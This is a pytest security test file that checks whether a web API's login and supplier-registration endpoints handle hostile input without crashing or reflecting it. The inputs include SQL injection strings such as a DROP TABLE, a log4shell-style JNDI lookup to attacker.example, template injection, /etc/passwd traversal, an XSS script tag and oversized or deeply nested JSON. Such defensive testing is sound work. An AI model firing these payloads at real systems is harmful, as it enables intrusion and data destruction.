"""Injection / payload-shape attacks.

We don't expect any of these to exploit — pydantic + parameterised SQL
on the backend should make them inert. The tests assert the server
*handles* malicious input gracefully (4xx, never 500 or stack trace,
never persists XSS payload verbatim into a response).
"""

from __future__ import annotations

import pytest

from api.client import ApiClient
from config.settings import Settings

# ---------- SQL/NoSQL injection in text fields -----------------------------


_SQL_PAYLOADS = [
    "' OR 1=1 --",
    '" OR "1"="1',
    "'; DROP TABLE users; --",
    "admin'--",
    "1' UNION SELECT NULL --",
    "${jndi:ldap://attacker.example/x}",  # log4shell shape
    "{{7*7}}",  # template injection
    "../../../../etc/passwd",
    "%00",  # null byte
]


@pytest.mark.security
@pytest.mark.parametrize("payload", _SQL_PAYLOADS, ids=lambda p: p[:20])
def test_login_with_injection_payload_does_not_500(
    api_client: ApiClient,
    payload: str,
) -> None:
    """Email / password fields must be inert against injection."""
    response = api_client._client.post(
        "/api/v1/auth/web/login",
        json={"email": f"{payload}@manziltest.uz", "password": payload},
        headers={"Accept": "application/json", "Content-Type": "application/json"},
    )
    assert response.status_code in (400, 401), (
        f"injection {payload!r} caused {response.status_code}: {response.text[:200]}"
    )


@pytest.mark.security
@pytest.mark.parametrize("payload", _SQL_PAYLOADS, ids=lambda p: p[:20])
def test_supplier_registration_with_injection_in_company_name(
    api_client: ApiClient,
    settings: Settings,
    email_from_pool: str,
    phone_from_pool: str,
    payload: str,
) -> None:
    """companyName goes into DB and possibly into emails — must be safe."""
    response = api_client._client.post(
        "/api/v1/auth/web/registrations/suppliers",
        json={
            "companyName": f"[E2E] {payload}",
            "tin": "200111222111",
            "email": email_from_pool,
            "phone": phone_from_pool,
            "fullName": "X",
            "password": settings.default_test_password,
        },
        headers={"Accept": "application/json", "Content-Type": "application/json"},
    )
    assert response.status_code < 500, (
        f"injection {payload!r} caused 5xx: {response.status_code} {response.text[:200]}"
    )


# ---------- payload-shape attacks ------------------------------------------


@pytest.mark.security
def test_oversized_payload_is_rejected(
    api_client: ApiClient,
) -> None:
    """A 5MB JSON body must not crash the gateway. Either 413 or 400."""
    huge = "A" * (5 * 1024 * 1024)
    response = api_client._client.post(
        "/api/v1/auth/web/login",
        json={"email": "a@b.uz", "password": huge},
        headers={"Accept": "application/json", "Content-Type": "application/json"},
        timeout=30,
    )
    assert response.status_code in (400, 413), (
        f"5MB payload returned {response.status_code} (expected 413 or 400)"
    )


@pytest.mark.security
def test_deeply_nested_json_does_not_500(
    api_client: ApiClient,
) -> None:
    """Defence against JSON-bomb DoS: 50-deep nested object."""
    nested: dict[str, object] = {"x": "y"}
    for _ in range(50):
        nested = {"x": nested}
    response = api_client._client.post(
        "/api/v1/auth/web/login",
        json=nested,
        headers={"Accept": "application/json", "Content-Type": "application/json"},
    )
    assert response.status_code in (400, 413), response.text


@pytest.mark.security
def test_malformed_json_returns_400(
    api_client: ApiClient,
) -> None:
    """Unparseable JSON body — gateway must 400, not 500."""
    response = api_client._client.post(
        "/api/v1/auth/web/login",
        content=b'{"email": "a@b.uz", "password":}',
        headers={"Accept": "application/json", "Content-Type": "application/json"},
    )
    assert response.status_code == 400, response.text


@pytest.mark.security
@pytest.mark.requires_email_otp  # uses verified_supplier_admin fixture
def test_invalid_uuid_path_param_returns_400(
    supplier_admin_client: ApiClient,
) -> None:
    """`/employees/{id}` with a non-UUID — server must reject before DB lookup."""
    response = supplier_admin_client._client.delete(
        "/api/v1/employees/not-a-uuid",
        headers={
            "Accept": "application/json",
            "Authorization": f"Bearer {supplier_admin_client.token}",
        },
    )
    assert response.status_code in (400, 404), response.text


@pytest.mark.security
@pytest.mark.requires_email_otp
def test_xss_payload_in_company_name_is_not_reflected_verbatim(
    api_client: ApiClient,
    settings: Settings,
    email_from_pool: str,
    phone_from_pool: str,
) -> None:
    """If backend echoes companyName back (e.g. in /me or registration error),
    the value MUST be properly encoded so a browser can't execute it.

    SPECULATIVE: requires backend to actually return the value. If it doesn't,
    this test is a no-op success — that's fine."""
    payload = "<script>alert('e2e-xss')</script>"
    response = api_client._client.post(
        "/api/v1/auth/web/registrations/suppliers",
        json={
            "companyName": f"[E2E] {payload}",
            "tin": "200888777666",
            "email": email_from_pool,
            "phone": phone_from_pool,
            "fullName": "X",
            "password": settings.default_test_password,
        },
        headers={"Accept": "application/json", "Content-Type": "application/json"},
    )
    # The script tag must NOT come back in any echoed response body verbatim.
    assert "<script>" not in response.text, "raw <script> reflected in response"
